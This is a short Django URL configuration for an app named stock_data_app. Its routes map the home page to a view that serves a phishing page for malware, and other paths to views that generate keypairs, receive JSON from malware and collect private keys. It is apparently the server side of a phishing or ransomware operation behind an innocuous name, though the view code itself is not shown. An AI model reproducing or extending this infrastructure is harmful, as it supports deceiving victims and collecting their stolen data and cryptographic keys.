# stock_data_app/urls.py
from django.urls import path
from . import views

app_name = 'web'

urlpatterns = [
    path('', views.serve_malware_page_phishing, name='home'),
    path('key', views.generate_keypair, name='gen_keypair'),
    path('receive', views.receive_json_from_malware, name='receive-malware-data'),
    path('privateKey', views.recieve_private_key, name='get_private_key'),
]
